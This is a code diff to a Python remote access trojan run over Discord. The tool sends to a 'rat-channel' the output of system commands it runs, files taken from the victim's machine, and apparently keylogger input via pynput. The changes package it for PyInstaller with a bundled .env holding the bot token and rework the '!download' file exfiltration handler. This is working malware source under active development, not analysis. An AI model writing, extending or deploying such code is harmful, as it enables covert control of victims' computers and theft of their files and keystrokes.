@@ -10,11 +10,23 @@ import ctypes
 import pyautogui
 import time
 import random
+import sys
 import webbrowser
 from pynput import keyboard
 import requests
+from dotenv import load_dotenv
 
-BOT_TOKEN = "your_discord_bot_token_here"
+def resource_path(relative_path):
+    try:
+        base_path = sys._MEIPASS
+    except Exception:
+        base_path = os.path.abspath(".")
+    return os.path.join(base_path, relative_path)
+
+env_path = resource_path(".env")
+load_dotenv(env_path)
+
+BOT_TOKEN = os.getenv("BOT_TOKEN")
 TARGET_CHANNEL = "rat-channel"
 
 keylog_listener = None
@@ -25,6 +37,7 @@ intents.message_content = True
 client = discord.Client(intents=intents)
 
 SYSTEM_ID = f"{os.getenv('USERNAME')}@{os.getenv('COMPUTERNAME')}"
+
 
 def execute_command(command): #execute system command (from CMD) and return output 
     try:
@@ -185,7 +198,7 @@ async def on_message(message):
             await message.channel.send(f"{SYSTEM_ID} info: \n{info}")
 
     elif message.content.startswith("!download"):
-        file_path = message.content[10:]
+        file_path = " ".join(args[2:])
         if os.path.isfile(file_path):
             await message.channel.send(f"📁 Downloading file from {SYSTEM_ID}: `{file_path}`", file=discord.File(file_path))
         else:
